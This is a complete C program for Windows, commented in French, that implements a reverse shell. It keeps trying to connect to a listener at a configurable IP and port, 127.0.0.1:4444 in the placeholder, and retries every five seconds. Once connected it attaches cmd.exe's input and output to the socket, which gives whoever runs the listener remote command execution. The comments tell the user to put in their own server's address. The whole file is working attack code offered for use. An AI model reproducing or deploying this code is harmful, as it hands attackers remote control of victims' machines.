#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <string.h>

#pragma comment(lib, "ws2_32")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    // Initialiser Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    // Adresse et port du serveur d'écoute
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("127.0.0.1"); // Remplace par l'adresse IP de ton serveur
    server.sin_port = htons(4444); // Remplace par le port de ton serveur

    // Tentative de connexion, avec une boucle pour la persistance de la connexion
    while (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        Sleep(5000); // Attendre 5 secondes avant de réessayer la connexion
    }

    // Préparer le processus pour rediriger les entrées/sorties
    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)sock;

    // Changer le répertoire de travail
    char currentDirectory[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, currentDirectory);
    SetCurrentDirectory("C:"); // Remplace par le chemin souhaité

    // Créer le processus cmd.exe
    char *command = "cmd.exe";
    CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);

    // Restaurer le répertoire de travail original
    SetCurrentDirectory(currentDirectory);

    return 0;
}
